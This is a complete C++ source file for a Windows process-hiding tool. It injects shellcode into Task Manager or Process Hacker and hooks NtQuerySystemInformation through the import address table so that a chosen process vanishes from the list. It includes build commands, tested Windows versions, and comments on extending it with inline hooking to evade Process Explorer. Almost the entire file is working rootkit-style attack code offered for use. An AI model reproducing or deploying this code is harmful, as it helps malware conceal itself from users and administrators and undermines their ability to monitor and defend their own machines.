#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>

#ifdef __GNUC__
#define offsetof(type, member)  __builtin_offsetof (type, member)
#endif

/*
	TESTS:
		-- Windows 10 x64
		-- Windows 7 x64
		-- Windows Server 2008 x32
		-- Windows xp x32
*/
/*
	BUILD:
		g++ ProcessHide.cpp -lntdll -o ProcessHide.exe
		g++ ProcessHide.cpp -lntdll -o ProcessHide.exe -m32
*/
/*
	NOTES:
		* This can be used multiple times on the same monitoring process
			if and only if the process is using NtQuerySystemInformation
			to get the processes list and is linked against ntdll.dll 
			like task manager and process hacker, actually the more it's 
			used the slower the monitoring process will be, also eventually
			after a lot of uses , theoretically, the monitoring process will 
			crash because the stack will be overflowed especially if it's
			x32 process because of the nature of x32 calling convention
		* This theoretical problem can be handled by modifying the shellcode 
			to search for a null separated list of processes names instead of
			searching for one process name at a time, also a detection if the
			shellcode is already used or this is the first time should be done
			if so the current process name will just be added to the already
			written shellcode processes names array
		* The same code can be used for ProcessExplorer but because ProcessExplorer
			isn't dynamically linked against ntdll.dll, the IAT hooking will not work,
			istead we can use a much powerfull hooking technique which is inline hooking,
			first get the base of ntdll (second item at PEB_LDR_DATA doubly-linked list)
			and parse its export table to get the address of NtQuerySystemInformation
			and from there redirect the call to the shellcode, also we will need
			a disassembler for that
*/

INT main(INT argc, CHAR** argv) {

	if (argc > 2)
	{
		DWORD dwTskMgrPid = atoi(argv[1]);
		LPCSTR szProcessName = argv[2];
		DWORD dwProcessNameLength = strlen(szProcessName) + 1;

		HANDLE hProcess = NULL;
		if (!(hProcess = OpenProcess(
			PROCESS_ALL_ACCESS,
			FALSE,
			dwTskMgrPid
		)))
		{
			printf("[-] Error at OpenProcess, code = %d\n", GetLastError());
			return FALSE;
		};
#if defined(_M_X64) || defined(__amd64__)
		printf("[+] Target monitoring process opened with handle 0x%llx\n", (ULONGLONG)hProcess);
#else
		printf("[+] Target monitoring process opened with handle 0x%lx\n", (ULONG)hProcess);
#endif

		ULONG ulWrittenSize = 0;
		LPVOID lpIsWow64 = NULL;
		NTSTATUS ntProcessStatus = STATUS_SUCCESS;
		if ((ntProcessStatus = NtQueryInformationProcess(
			hProcess,
			ProcessWow64Information,
			&lpIsWow64,
			sizeof(lpIsWow64),
			&ulWrittenSize
		)) || ulWrittenSize != sizeof(lpIsWow64))
		{
			printf("[-] Error at NtQueryInformationProcess, status code = 0x%x\n", ntProcessStatus);
			return FALSE;
		};

#if defined(_M_X64) || defined(__amd64__)
		if (lpIsWow64)
		{
			puts("[+] Target monitoring process is x32 process running on x64 system");
			puts("[!] Use the x32 binary to handle this x32 process");
			return FALSE;
		};
		puts("[+] Target monitoring process is x64 process running on x64 system");
#else
		HMODULE hKernel32 = NULL;
		if (!(hKernel32 = GetModuleHandleA("kernel32")))
		{
			printf("[-] Error at GetModuleHandle, code = %d\n", GetLastError());
			return FALSE;
		};

		LPVOID fnGetSystemWow64DirectoryA = NULL;
		if ((fnGetSystemWow64DirectoryA = (LPVOID)GetProcAddress(hKernel32, "GetSystemWow64DirectoryA")))
		{
			CHAR WoW64Dir[1] = { 0 };
			if ((*(UINT(*)(LPSTR, UINT)) fnGetSystemWow64DirectoryA)(
				WoW64Dir,
				sizeof(WoW64Dir)
				))
			{
				if (!lpIsWow64)
				{
					puts("[+] Target monitoring process is x64 process running on x64 system");
					puts("[!] Use the x64 binary to handle this x64 process");
					return FALSE;
				};
				puts("[+] Target monitoring process is x32 process running on x64 system");
			}
			else if (GetLastError() == ERROR_CALL_NOT_IMPLEMENTED)
			{
				puts("[+] Target monitoring process is x32 process running on x32 system");
			}
			else
			{
				printf("[-] Error at GetSystemWow64DirectoryA, code = %d\n", GetLastError());
				return FALSE;
			};
		}
		else if (GetLastError() == ERROR_PROC_NOT_FOUND)
		{
			puts("[+] Target monitoring process is x32 process running on x32 system");
		}
		else
		{
			printf("[-] Error at GetProcAddress, code = %d\n", GetLastError());
			return FALSE;
		};
#endif

		BYTE bProcessBasicInfo[sizeof(PROCESS_BASIC_INFORMATION)] = { 0 };
		ntProcessStatus = STATUS_SUCCESS;
		if ((ntProcessStatus = NtQueryInformationProcess(
			hProcess,
			ProcessBasicInformation,
			(PVOID)bProcessBasicInfo,
			sizeof(PROCESS_BASIC_INFORMATION),
			&ulWrittenSize
		)) || ulWrittenSize != sizeof(PROCESS_BASIC_INFORMATION))
		{
			printf("[-] Error at NtQueryInformationProcess, status code = 0x%x\n", ntProcessStatus);
			return FALSE;
		};
		PPROCESS_BASIC_INFORMATION lpProcessBasicInfo = (PPROCESS_BASIC_INFORMATION)bProcessBasicInfo;
#if defined(_M_X64) || defined(__amd64__)
		printf("[+] Got the process environment block address (PEB) = 0x%llx\n", (ULONGLONG)lpProcessBasicInfo->PebBaseAddress);
#else
		printf("[+] Got the process environment block address (PEB) = 0x%lx\n", (ULONG)lpProcessBasicInfo->PebBaseAddress);
#endif

		SIZE_T stReadBytes = 0;
		BYTE bPeb[sizeof(PEB)] = { 0 };
		if (!ReadProcessMemory(
			hProcess,
			(LPVOID)lpProcessBasicInfo->PebBaseAddress,
			(LPVOID)bPeb,
			sizeof(bPeb),
			&stReadBytes
		) || stReadBytes != sizeof(bPeb))
		{
			printf("[-] Error at ReadProcessMemory, code = %d\n", GetLastError());
			return FALSE;
		};
		PPEB lpPeb = (PPEB)bPeb;
#if defined(_M_X64) || defined(__amd64__)
		printf("[+] Got the PEB_LDR_DATA structure address = 0x%llx\n", (ULONGLONG)lpPeb->Ldr);
#else
		printf("[+] Got the PEB_LDR_DATA structure address = 0x%lx\n", (ULONG)lpPeb->Ldr);
#endif

		LPVOID lpMainModule = NULL;
		if (!ReadProcessMemory(
			hProcess,
#if defined(_M_X64) || defined(__amd64__)
			(LPVOID)((ULONGLONG)lpPeb->Ldr + 0x10),
#else
			(LPVOID)((ULONG)lpPeb->Ldr + 0x0c),
#endif
			&lpMainModule,
			sizeof(lpMainModule),
			&stReadBytes
		) || stReadBytes != sizeof(lpMainModule))
		{
			printf("[-] Error at ReadProcessMemory, code = %d\n", GetLastError());
			return FALSE;
		};
#if defined(_M_X64) || defined(__amd64__)
		printf("[+] Got the main module LDR_DATA_TABLE_ENTRY structure address = 0x%llx\n", (ULONGLONG)lpMainModule);
#else
		printf("[+] Got the main module LDR_DATA_TABLE_ENTRY structure address = 0x%lx\n", (ULONG)lpMainModule);
#endif

		LPVOID lpImageBase = NULL;
		if (!ReadProcessMemory(
			hProcess,
#if defined(_M_X64) || defined(__amd64__)
			(LPVOID)((ULONGLONG)lpMainModule + 0x30),
#else
			(LPVOID)((ULONG)lpMainModule + 0x18),
#endif
			&lpImageBase,
			sizeof(lpImageBase),
			&stReadBytes
		) || stReadBytes != sizeof(lpImageBase))
		{
			printf("[-] Error at ReadProcessMemory, code = %d\n", GetLastError());
			return FALSE;
		};
#if defined(_M_X64) || defined(__amd64__)
		printf("[+] Got the main module base address = 0x%llx\n", (ULONGLONG)lpImageBase);
#else
		printf("[+] Got the main module base address = 0x%lx\n", (ULONG)lpImageBase);
#endif
		
		BYTE bDosHeader[sizeof(IMAGE_DOS_HEADER)] = { 0 };
		if (!ReadProcessMemory(
			hProcess,
			lpImageBase,
			(LPVOID)bDosHeader,
			sizeof(bDosHeader),
			&stReadBytes
		) || stReadBytes != sizeof(bDosHeader))
		{
			printf("[-] Error at ReadProcessMemory, code = %d\n", GetLastError());
			return FALSE;
		};
		PIMAGE_DOS_HEADER lpDosHeader = (PIMAGE_DOS_HEADER)bDosHeader;
#if defined(_M_X64) || defined(__amd64__)
		printf("[+] Got the IMAGE_NT_HEADERS structure address = 0x%llx\n", (ULONGLONG)lpImageBase + lpDosHeader->e_lfanew);
#else
		printf("[+] Got the IMAGE_NT_HEADERS structure address = 0x%lx\n", (ULONG)lpImageBase + lpDosHeader->e_lfanew);
#endif

		BYTE bNtHeader[sizeof(IMAGE_NT_HEADERS)] = { 0 };
		if (!ReadProcessMemory(
			hProcess,
#if defined(_M_X64) || defined(__amd64__)
			(LPVOID)((ULONGLONG)lpImageBase + lpDosHeader->e_lfanew),
#else
			(LPVOID)((ULONG)lpImageBase + lpDosHeader->e_lfanew),
#endif
			(LPVOID)bNtHeader,
			sizeof(bNtHeader),
			&stReadBytes
		) || stReadBytes != sizeof(bNtHeader))
		{
			printf("[-] Error at ReadProcessMemory, code = %d\n", GetLastError());
			return FALSE;
		};
		PIMAGE_NT_HEADERS lpNtHeader = (PIMAGE_NT_HEADERS)bNtHeader;

		CHAR szModName[MAX_PATH] = { 0 };
		DWORD dwImportDataRva = lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
		PIMAGE_IMPORT_DESCRIPTOR lpImportData = NULL;
#if defined(_M_X64) || defined(__amd64__)
		printf("[+] Got the import address table (IAT) address = 0x%llx\n", (ULONGLONG)lpImageBase + dwImportDataRva);
#else
		printf("[+] Got the import address table (IAT) address = 0x%lx\n", (ULONG)lpImageBase + dwImportDataRva);
#endif

		do
		{
			BYTE bImportData[sizeof(IMAGE_IMPORT_DESCRIPTOR)] = { 0 };
			if (!ReadProcessMemory(
				hProcess,
#if defined(_M_X64) || defined(__amd64__)
				(LPVOID)((ULONGLONG)lpImageBase + dwImportDataRva),
#else
				(LPVOID)((ULONG)lpImageBase + dwImportDataRva),
#endif
				(LPVOID)bImportData,
				sizeof(bImportData),
				&stReadBytes
			) || stReadBytes != sizeof(bImportData))
			{
				printf("[-] Error at ReadProcessMemory, code = %d\n", GetLastError());
				return FALSE;
			};
			lpImportData = (PIMAGE_IMPORT_DESCRIPTOR)bImportData;

			if (!ReadProcessMemory(
				hProcess,
#if defined(_M_X64) || defined(__amd64__)
				(LPVOID)((ULONGLONG)lpImageBase + lpImportData->Name),
#else
				(LPVOID)((ULONG)lpImageBase + lpImportData->Name),
#endif
				(LPVOID)szModName,
				sizeof(szModName),
				&stReadBytes
			) || stReadBytes != sizeof(szModName))
			{
				printf("[-] Error at ReadProcessMemory, code = %d\n", GetLastError());
				return FALSE;
			};

			dwImportDataRva += sizeof(IMAGE_IMPORT_DESCRIPTOR);

		} while (strcmp(szModName, "ntdll.dll"));

		dwImportDataRva -= sizeof(IMAGE_IMPORT_DESCRIPTOR);
#if defined(_M_X64) || defined(__amd64__)
		printf("[+] Got the ntdll IMAGE_THUNK_DATA array head address = 0x%llx\n", (ULONGLONG)lpImageBase + dwImportDataRva);
#else
		printf("[+] Got the ntdll IMAGE_THUNK_DATA array head address = 0x%lx\n", (ULONG)lpImageBase + dwImportDataRva);
#endif

		CHAR szApiName[MAX_PATH] = { 0 };
		DWORD dwThunkDataRva = lpImportData->OriginalFirstThunk;
		PIMAGE_THUNK_DATA lpThunkData = NULL;
		do
		{
			BYTE bThunkData[sizeof(IMAGE_THUNK_DATA)] = { 0 };
			if (!ReadProcessMemory(
				hProcess,
#if defined(_M_X64) || defined(__amd64__)
				(LPVOID)((ULONGLONG)lpImageBase + dwThunkDataRva),
#else
				(LPVOID)((ULONG)lpImageBase + dwThunkDataRva),
#endif
				(LPVOID)bThunkData,
				sizeof(bThunkData),
				&stReadBytes
			) || stReadBytes != sizeof(bThunkData))
			{
				printf("[-] Error at ReadProcessMemory, code = %d\n", GetLastError());
				return FALSE;
			};
			lpThunkData = (PIMAGE_THUNK_DATA)bThunkData;

			if (!IMAGE_SNAP_BY_ORDINAL(lpThunkData->u1.Ordinal))
			{
				if (!ReadProcessMemory(
					hProcess,
#if defined(_M_X64) || defined(__amd64__)
					(LPVOID)((ULONGLONG)lpImageBase + lpThunkData->u1.AddressOfData + sizeof(WORD)),
#else
					(LPVOID)((ULONG)lpImageBase + lpThunkData->u1.AddressOfData + sizeof(WORD)),
#endif
					(LPVOID)szApiName,
					sizeof(szApiName),
					&stReadBytes
				) || stReadBytes != sizeof(szApiName))
				{
					printf("[-] Error at ReadProcessMemory, code = %d\n", GetLastError());
					return FALSE;
				};
			};

			dwThunkDataRva += sizeof(IMAGE_THUNK_DATA);
		} while (strcmp(szApiName, "NtQuerySystemInformation"));

		DWORD dwTargetThunkOffset = dwThunkDataRva - lpImportData->OriginalFirstThunk - sizeof(IMAGE_THUNK_DATA);
		DWORD dwTargetThunkRva = lpImportData->FirstThunk + dwTargetThunkOffset;
#if defined(_M_X64) || defined(__amd64__)
		LPVOID lpTargetThunkAddress = (LPVOID)((ULONGLONG)lpImageBase + dwTargetThunkRva);
		printf("[+] Found NtQuerySystemInformation thunk at 0x%llx\n", (ULONGLONG)lpTargetThunkAddress);
#else
		LPVOID lpTargetThunkAddress = (LPVOID)((ULONG)lpImageBase + dwTargetThunkRva);
		printf("[+] Found NtQuerySystemInformation thunk at 0x%lx\n", (ULONG)lpTargetThunkAddress);
#endif

		BYTE bThunkData[sizeof(IMAGE_THUNK_DATA)] = { 0 };
		if (!ReadProcessMemory(
			hProcess,
			lpTargetThunkAddress,
			(LPVOID)bThunkData,
			sizeof(bThunkData),
			&stReadBytes
		) || stReadBytes != sizeof(bThunkData))
		{
			printf("[-] Error at ReadProcessMemory, code = %d\n", GetLastError());
			return FALSE;
		};
		lpThunkData = (PIMAGE_THUNK_DATA)bThunkData;

#if defined(_M_X64) || defined(__amd64__)
		printf("[+] Found NtQuerySystemInformation api at 0x%llx\n", lpThunkData->u1.AddressOfData);
#else
		printf("[+] Found NtQuerySystemInformation api at 0x%lx\n", lpThunkData->u1.AddressOfData);
#endif

		PBYTE lpApiAddressBytes = (PBYTE)&lpThunkData->u1.AddressOfData;
		BYTE bShellCode[] = { 
#if defined(_M_X64) || defined(__amd64__)

			/*
				0:  51                      push   rcx
				1:  52                      push   rdx
				2:  48 00 00 00 00 00 00    movabs rax,<ntdll.NtQuerySystemInformation>
				9:  00 00 00
				c:  ff d0                   call   rax
				e:  5a                      pop    rdx
				f:  59                      pop    rcx
				10: 48 85 c0                test   rax,rax
				13: 75 5b                   jne    0x70
				15: 48 83 f9 00             cmp    rcx,SystemProcessInformation
				19: 75 55                   jne    0x70
				1b: 44 8b 12                mov    r10d,DWORD PTR [rdx]
				1e: 4c 01 d2                add    rdx,r10
				21: 48 8d 0d 00 00 00 00    lea    rcx,[rip+0x0]        # 0x28
				28: 48 83 c1 49             add    rcx,0x49
				2c: 49 89 d0                mov    r8,rdx
				2f: 49 83 c0 00             add    r8,offsetof(SYSTEM_PROCESS_INFORMATION, ImageName) + offsetof(UNICODE_STRING, Buffer)
				33: 4d 8b 00                mov    r8,QWORD PTR [r8]
				36: 44 8a 09                mov    r9b,BYTE PTR [rcx]
				39: 45 3a 08                cmp    r9b,BYTE PTR [r8]
				3c: 75 27                   jne    0x65
				3e: 45 84 c9                test   r9b,r9b
				41: 75 18                   jne    0x5b
				43: 44 8b 0a                mov    r9d,DWORD PTR [rdx]
				46: 4c 29 d2                sub    rdx,r10
				49: 45 85 c9                test   r9d,r9d 
				4c: 75 08                   jne    0x56
				4e: c7 02 00 00 00 00		mov    DWORD PTR [rdx],0x0
				54: eb 1a                   jmp    0x70
				56: 44 01 0a                add    DWORD PTR [rdx],r9d
				59: eb 0A                   jmp    0x65
				5b: 48 83 c1 01             add    rcx,0x1
				5f: 49 83 c0 02             add    r8,0x2
				63: eb d1                   jmp    0x36
				65: 44 8b 12                mov    r10d,DWORD PTR [rdx]
				68: 4c 01 d2                add    rdx,r10
				6b: 45 85 d2                test   r10d,r10d
				6e: 75 b1                   jne    0x21
				70: c3                      ret
				db szProcessName
			*/

			0x51, 0x52, 0x48, 0xB8,
			lpApiAddressBytes[0], lpApiAddressBytes[1],
			lpApiAddressBytes[2], lpApiAddressBytes[3],
			lpApiAddressBytes[4], lpApiAddressBytes[5],
			lpApiAddressBytes[6], lpApiAddressBytes[7],
			0xFF, 0xD0, 0x5A, 0x59,
			0x48, 0x85, 0xC0, 0x75,
			0x5B, 0x48, 0x83, 0xf9,
			(BYTE)SystemProcessInformation,
			0x75, 0x55, 0x44, 0x8B,
			0x12, 0x4C, 0x01, 0xD2,
			0x48, 0x8D, 0x0D, 0x00,
			0x00, 0x00, 0x00, 0x48,
			0x83, 0xC1, 0x49, 0x49,
			0x89, 0xD0, 0x49, 0x83,
			0xC0, (BYTE)(offsetof(SYSTEM_PROCESS_INFORMATION, ImageName) + offsetof(UNICODE_STRING, Buffer)),
			0x4D, 0x8B, 0x00, 0x44,
			0x8A, 0x09, 0x45, 0x3A,
			0x08, 0x75, 0x27, 0x45,
			0x84, 0xC9, 0x75, 0x18,
			0x44, 0x8B, 0x0A, 0x4C,
			0x29, 0xD2, 0x45, 0x85,
			0xC9, 0x75, 0x08, 0xC7,
			0x02, 0x00, 0x00, 0x00,
			0x00, 0xEB, 0x1A, 0x44,
			0x01, 0x0A, 0xEB, 0x0A,
			0x48, 0x83, 0xC1, 0x01,
			0x49, 0x83, 0xC0, 0x02,
			0xEB, 0xD1, 0x44, 0x8B,
			0x12, 0x4C, 0x01, 0xD2,
			0x45, 0x85, 0xD2, 0x75,
			0xB1, 0xC3
#else
			/*
				0:  ff 74 24 10             push   DWORD PTR [esp+0x10]
				4:  ff 74 24 10             push   DWORD PTR [esp+0x10]
				8:  ff 74 24 10             push   DWORD PTR [esp+0x10]
				c:  ff 74 24 10             push   DWORD PTR [esp+0x10]
				10: b8 00 00 00 00          mov    eax,<ntdll.NtQuerySystemInformation>
				15: ff d0                   call   eax
				17: 8b 4c 24 04             mov    ecx,DWORD PTR [esp+0x4]
				1b: 8b 54 24 08             mov    edx,DWORD PTR [esp+0x8]
				1f: 85 c0                   test   eax,eax
				21: 75 49                   jne    0x6c
				23: 83 f9 00                cmp    ecx,SystemProcessInformation
				26: 75 44                   jne    0x6c
				28: 60                      pusha
				29: 8b 3a                   mov    edi,DWORD PTR [edx]
				2b: 01 fa                   add    edx,edi
				2d: e8 00 00 00 00          call   0x32
				32: 59                      pop    ecx
				33: 83 c1 3d                add    ecx,0x3d
				36: 89 d3                   mov    ebx,edx
				38: 83 c3 00                add    ebx,offsetof(SYSTEM_PROCESS_INFORMATION, ImageName) + offsetof(UNICODE_STRING, Buffer)
				3b: 8b 1b                   mov    ebx,DWORD PTR [ebx]
				3d: 8a 01                   mov    al,BYTE PTR [ecx]
				3f: 3a 03                   cmp    al,BYTE PTR [ebx]
				41: 75 20                   jne    0x63
				43: 84 c0                   test   al,al
				45: 75 14                   jne    0x5b
				47: 8b 02                   mov    eax,DWORD PTR [edx]
				49: 29 fa                   sub    edx,edi
				4b: 85 c0                   test   eax,eax
				4d: 75 08                   jne    0x57
				4f: c7 02 00 00 00 00       mov    DWORD PTR [edx],0x0
				55: eb 14                   jmp    0x6b
				57: 01 02                   add    DWORD PTR [edx],eax
				59: eb 08                   jmp    0x63
				5b: 83 c1 01                add    ecx,0x1
				5e: 83 c3 02                add    ebx,0x2
				61: eb da                   jmp    0x3d
				63: 8b 3a                   mov    edi,DWORD PTR [edx]
				65: 01 fa                   add    edx,edi
				67: 85 ff                   test   edi,edi
				69: 75 c2                   jne    0x2d
				6b: 61                      popa
				6c: c2 10 00                ret    0x10
				db szProcessName
			*/

			0xFF, 0x74, 0x24, 0x10,
			0xFF, 0x74, 0x24, 0x10,
			0xFF, 0x74, 0x24, 0x10,
			0xFF, 0x74, 0x24, 0x10, 0xB8,
			lpApiAddressBytes[0], lpApiAddressBytes[1],
			lpApiAddressBytes[2], lpApiAddressBytes[3],
			0xFF, 0xD0, 0x8B, 0x4C,
			0x24, 0x04, 0x8B, 0x54,
			0x24, 0x08, 0x85, 0xC0,
			0x75, 0x49, 0x83, 0xF9,
			(BYTE)SystemProcessInformation,
			0x75, 0x44, 0x60, 0x8B,
			0x3A, 0x01, 0xFA, 0xE8,
			0x00, 0x00, 0x00, 0x00,
			0x59, 0x83, 0xC1, 0x3D,
			0x89, 0xD3, 0x83, 0xC3,
			(BYTE)(offsetof(SYSTEM_PROCESS_INFORMATION, ImageName) + offsetof(UNICODE_STRING, Buffer)),
			0x8B, 0x1B, 0x8A, 0x01,
			0x3A, 0x03, 0x75, 0x20,
			0x84, 0xC0, 0x75, 0x14,
			0x8B, 0x02, 0x29, 0xFA,
			0x85, 0xC0, 0x75, 0x08,
			0xC7, 0x02, 0x00, 0x00,
			0x00, 0x00, 0xEB, 0x14,
			0x01, 0x02, 0xEB, 0x08,
			0x83, 0xC1, 0x01, 0x83,
			0xC3, 0x02, 0xEB, 0xDA,
			0x8B, 0x3A, 0x01, 0xFA,
			0x85, 0xFF, 0x75, 0xC2,
			0x61, 0xC2, 0x10, 0x00
#endif
		};

		LPVOID lpShellCodeAddress = NULL;
		if (!(lpShellCodeAddress = VirtualAllocEx(
			hProcess,
			NULL,
			sizeof(bShellCode) + dwProcessNameLength,
			(MEM_COMMIT | MEM_RESERVE),
			PAGE_EXECUTE_READ
		)))
		{
			printf("[-] Error at VirtualAllocEx, code = %d\n", GetLastError());
			return FALSE;
		};

		SIZE_T stWrittenBytes = 0;
		if (!WriteProcessMemory(
			hProcess,
			lpShellCodeAddress,
			(LPVOID)bShellCode,
			sizeof(bShellCode),
			&stWrittenBytes
		) || stWrittenBytes != sizeof(bShellCode))
		{
			printf("[-] Error at WriteProcessMemory, code = %d", GetLastError());
			return FALSE;
		};

		if (!WriteProcessMemory(
			hProcess,
#if defined(_M_X64) || defined(__amd64__)
			(LPVOID)((ULONGLONG)lpShellCodeAddress + sizeof(bShellCode)),
#else
			(LPVOID)((ULONG)lpShellCodeAddress + sizeof(bShellCode)),
#endif
			(LPVOID)szProcessName,
			dwProcessNameLength,
			&stWrittenBytes
		) || stWrittenBytes != dwProcessNameLength)
		{
			printf("[-] Error at WriteProcessMemory, code = %d", GetLastError());
			return FALSE;
		};
#if defined(_M_X64) || defined(__amd64__)
		printf("[+] Shellcode with size %d, written at 0x%llx\n", sizeof(bShellCode) + dwProcessNameLength, (ULONGLONG)lpShellCodeAddress);
#else
		printf("[+] Shellcode with size %d, written at 0x%lx\n", sizeof(bShellCode) + dwProcessNameLength, (ULONG)lpShellCodeAddress);
#endif

		MEMORY_BASIC_INFORMATION stMBI = { 0 };
		if (!VirtualQueryEx(
			hProcess,
			lpTargetThunkAddress,
			&stMBI,
			sizeof(stMBI)
		))
		{
			printf("[-] Error at VirtualQueryEx, code = %d\n", GetLastError());
			return FALSE;
		};

		DWORD dwOldProtect = 0;
		if (stMBI.Protect != PAGE_EXECUTE_READWRITE &&
			stMBI.Protect != PAGE_EXECUTE_WRITECOPY &&
			stMBI.Protect != PAGE_READWRITE &&
			stMBI.Protect != PAGE_WRITECOPY
			)
		{
			if (!VirtualProtectEx(
				hProcess,
				lpTargetThunkAddress,
				sizeof(lpThunkData->u1.AddressOfData),
				PAGE_EXECUTE_READWRITE,
				&dwOldProtect
			) || dwOldProtect != stMBI.Protect)
			{
				printf("[-] Error at VirtualProtectEx, code = %d\n", GetLastError());
				return FALSE;
			};
			puts("[+] IAT page protection changed to PAGE_EXECUTE_READWRITE");

		};

		if (!WriteProcessMemory(
			hProcess,
			lpTargetThunkAddress,
			&lpShellCodeAddress,
			sizeof(lpShellCodeAddress),
			&stWrittenBytes
		) || stWrittenBytes != sizeof(lpShellCodeAddress))
		{
			printf("[-] Error at WriteProcessMemory, code = %d", GetLastError());
			return FALSE;
		};
		puts("[+] Calls to NtQuerySystemInformation have been redirected to the shellcode");

		if (dwOldProtect)
		{
			if (!VirtualProtectEx(
				hProcess,
				lpTargetThunkAddress,
				sizeof(lpThunkData->u1.AddressOfData),
				stMBI.Protect,
				&dwOldProtect
			))
			{
				printf("[-] Error at VirtualProtectEx, code = %d\n", GetLastError());
				return FALSE;
			};
			puts("[+] IAT page protection changed to its old value");
		};

		CloseHandle(hProcess);
		printf("[+] Any process with name %s should be hidden now\n", szProcessName);

		return TRUE;
	}
	else
	{
		printf("%s [pid_of_taskmgr/process_hacker] [name_to_hide]\n", argv[0]);
		return TRUE;
	};
};